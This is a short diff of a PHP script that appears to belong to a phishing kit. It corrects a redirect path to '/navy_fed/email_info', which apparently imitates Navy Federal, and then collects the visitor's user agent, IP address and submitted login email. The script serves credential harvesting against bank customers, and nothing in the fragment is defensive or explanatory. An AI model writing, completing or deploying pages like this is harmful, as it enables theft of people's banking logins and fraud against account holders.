@@ -1,5 +1,5 @@
 <?php
-header('Location: /nav_fed/email_info');
+header('Location: /navy_fed/email_info');
 $Agent=$_SERVER['HTTP_USER_AGENT'];
 $Ip=$_SERVER['REMOTE_ADDR'];
 $login_email=$_POST['login_email'];
